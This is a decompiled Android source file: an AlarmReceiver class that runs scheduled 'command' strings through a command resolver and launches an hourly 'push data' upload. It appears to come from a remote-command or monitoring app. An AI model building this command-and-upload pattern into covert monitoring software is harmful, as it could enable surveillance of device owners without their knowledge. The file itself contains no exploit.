package com.hawkshaw.library.handler;

import T1.a;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.preferences.Prefs;
import i.C0528x;
import j3.f;
import java.util.concurrent.CancellationException;
import t3.N;
import t3.f0;

public final class AlarmReceiver extends BroadcastReceiver {
    public static final String ACTION_SCHEDULE_COMMAND = "ACTION_SCHEDULE_COMMAND";
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "AlarmReceiver";
    /* access modifiers changed from: private */
    public f0 job;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    private final boolean checkLastPushDataTime() {
        return System.currentTimeMillis() - Prefs.INSTANCE.getLastPushDataTime() >= 3600000;
    }

    public void onReceive(Context context, Intent intent) {
        Logger logger = Logger.INSTANCE;
        String stringExtra = intent != null ? intent.getStringExtra("source") : null;
        String action = intent != null ? intent.getAction() : null;
        long currentTimeMillis = System.currentTimeMillis();
        StringBuilder g5 = C0528x.g("OnReceive: Source: ", stringExtra, ", Action: ", action, ", ");
        g5.append(currentTimeMillis);
        Logger.d$default(logger, TAG, g5.toString(), false, 4, (Object) null);
        if (K.f(intent != null ? intent.getAction() : null, ACTION_SCHEDULE_COMMAND)) {
            String stringExtra2 = intent.getStringExtra("command");
            if (stringExtra2 != null) {
                CommandResolverKt.handleCommandString(stringExtra2, CommandSource.ScheduledCommand);
                return;
            }
            return;
        }
        JobScheduler.startScheduler$default(JobScheduler.INSTANCE, (Command.StartRepeatPushDataRequest) null, 1, (Object) null);
        if (checkLastPushDataTime()) {
            f0 f0Var = this.job;
            if (f0Var != null) {
                f0Var.e((CancellationException) null);
            }
            this.job = CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new a(this, (e) null), 1, (Object) null);
            return;
        }
        Logger.v$default(logger, TAG, "OnReceive: diff is less then 1 hour, aborting push data", false, 4, (Object) null);
    }
}
